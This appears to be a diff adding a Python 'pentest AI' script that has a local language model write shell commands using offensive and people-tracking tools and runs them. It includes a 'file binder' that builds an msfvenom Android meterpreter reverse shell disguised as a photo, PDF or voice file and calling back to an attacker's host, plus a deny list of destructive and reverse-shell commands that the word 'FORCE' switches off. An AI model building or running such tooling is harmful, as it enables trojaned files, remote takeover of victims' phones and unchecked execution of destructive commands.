@@ -1,0 +1,157 @@
+#!/usr/bin/env python3
+import requests
+import subprocess
+import sys
+import re
+import os
+import threading
+import datetime
+
+# ==============================================
+# CONFIGURATION
+# ==============================================
+OLLAMA_URL = "http://localhost:11434/api/generate"
+MODEL = "llama3" 
+
+ALLOWED_TOOLS = [
+    "nmap", "gobuster", "sqlmap", "nikto", "dirsearch",
+    "whatweb", "enum4linux", "hydra", "ffuf", "msfvenom",
+    "sherlock", "exiftool", "whois", "theharvester",
+    "holehe", "phoneinfoga", "dnsrecon", "arp-scan", 
+    "wpscan", "airodump-ng", "aireplay-ng", "instaloader",
+    "proxychains", "msfconsole", "cupp", "social-analyzer"
+]
+
+REPORT_DIR = "pentest_reports"
+if not os.path.exists(REPORT_DIR):
+    os.makedirs(REPORT_DIR)
+
+# ==============================================
+# FULL DANGEROUS PATTERNS (RE-INSTATED)
+# ==============================================
+DANGEROUS_PATTERNS = [
+    r'\brm\s+-rf\b', r'\brm\s+-r\b.*\b/\b', r'\brm\s+-rf\s+\.\b',
+    r'\brm\s+-rf\s+\~\b', r'\brm\s+-rf\s+/\b',
+    r'\bdd\s+if=', r'\bdd\s+of=/dev/', r'\bmkfs\b', r'\bwipefs\b',
+    r'\bchmod\s+(-R\s+)?777\b', r'\bchmod\s+(-R\s+)?000\b',
+    r'\bchown\s+(-R\s+)?root\b', r'\bchown\s+(-R\s+)?0:0\b',
+    r'\bwget\s+.*\bhttps?://', r'\bcurl\s+.*\bhttps?://',
+    r'\b\|\s*(bash|sh|zsh|python|perl|ruby)\b',
+    r';', r'&&', r'\|\|', r'\|', r'\$\(', r'`', r'\$\{',
+    r':\(\)\s*{\s*:\|\:&}\s*;:?', 
+    r'\bnc\s+.*-e\b', r'\bnetcat\s+.*-e\b', r'\bsshd?\b.*-R\b',
+    r'\bmknod\b.*\bp\b',
+    r'\becho\s+.*\b>>.*\bcrontab\b', r'\bcrontab\s+-e\b',
+    r'\b\.bashrc\b|\b\.bash_profile\b|\b\.profile\b',
+    r'\bsystemctl\s+(stop|disable|mask)\b', r'\bufw\s+disable\b',
+    r'\biptables\s+-F\b', r'\bchattr\s+\+[i|a]\b',
+    r'\bpython\s+-c.*(os\.system|subprocess\.call|exec)\b',
+    r'\bperl\s+-e.*exec', r'\beval\b'
+]
+
+# ==============================================
+# CORE LOGIC & SMART FUNCTIONS
+# ==============================================
+
+def query_ollama(prompt):
+    try:
+        response = requests.post(OLLAMA_URL, json={'model': MODEL, 'prompt': prompt, 'stream': False}, timeout=180)
+        return response.json()['response'].strip()
+    except Exception as e:
+        print(f"Ollama Error: {e}")
+        return None
+
+def smart_fixer(command):
+    if "sherlock" in command and "-" in command and "--" not in command:
+        command = command.replace("sherlock", "sherlock --")
+    if "instaloader" in command and "--break-system-packages" not in command:
+        command = f"{command} --break-system-packages"
+    return command
+
+def check_security(cmd, user_input):
+    cmd_lower = cmd.lower()
+    input_lower = user_input.lower()
+    
+    if 'sudo' in cmd_lower and 'extreme' not in input_lower:
+        return False, "Sudo access requires 'extreme' flag."
+    
+    for pat in DANGEROUS_PATTERNS:
+        if re.search(pat, cmd_lower):
+            if 'force' not in input_lower:
+                return False, f"Blocked Pattern: {pat}. Use 'FORCE' to bypass."
+    
+    return True, "Safe"
+
+def execute_async(cmd, user_input):
+    def run():
+        print(f"\n[*] Target Acquired. Executing: {cmd}")
+        try:
+            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+            full_output = ""
+            for line in process.stdout:
+                print(f"  > {line}", end="")
+                full_output += line
+            process.wait()
+            
+            # Save Activity Report
+            log_file = os.path.join(REPORT_DIR, "activity_log.txt")
+            with open(log_file, "a") as f:
+                f.write(f"[{datetime.datetime.now()}]\nTask: {user_input}\nCommand: {cmd}\nOutput:\n{full_output}\n{'-'*80}\n")
+        except Exception as e:
+            print(f"[-] Runtime Error: {e}")
+
+    threading.Thread(target=run).start()
+
+# ==============================================
+# THE BINDER: PDF / IMAGE / VOICE
+# ==============================================
+
+def advanced_binder():
+    print("\n--- Advanced File Binder (Lab Mode) ---")
+    original = input("Path to original file (photo.jpg/doc.pdf/voice.mp3): ")
+    if not os.path.exists(original):
+        print("[-] Error: Original file not found.")
+        return None
+    
+    lhost = input("LHOST (IP/Ngrok): ")
+    lport = input("LPORT: ")
+    output = f"weaponized_{os.path.basename(original)}.apk"
+    
+    # Binding payload to original file as template
+    cmd = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -x {original} R > {output}"
+    return cmd
+
+def main():
+    print("\n" + "="*50)
+    print("   PENTEST-AI: EXTREME POWER UNLOCKED   ")
+    print("="*50)
+    
+    if len(sys.argv) < 2:
+        user_input = input("\n[Analyze Request] > ")
+    else:
+        user_input = " ".join(sys.argv[1:])
+
+    # Special Lab Triggers
+    if any(x in user_input.lower() for x in ["bind", "pdf", "photo", "voice"]):
+        command = advanced_binder()
+    elif "anonymous" in user_input.lower():
+        print("[*] Anonymous mode enabled. Use 'proxychains' for network hiding.")
+        return
+    else:
+        prompt = f"Generate ONE shell command for: {user_input}. Tools: {', '.join(ALLOWED_TOOLS)}. Raw command only."
+        command = query_ollama(prompt)
+
+    if not command: return
+    command = smart_fixer(command.replace('`', '').strip())
+    print(f"\nProposed Strategy: {command}")
+
+    is_safe, reason = check_security(command, user_input)
+    if not is_safe:
+        print(f"REJECTED: {reason}")
+        return
+
+    if input("\nAuthorize Execution? (y/n): ").lower() == 'y':
+        execute_task_async = execute_async(command, user_input)
+
+if __name__ == "__main__":
+    main()
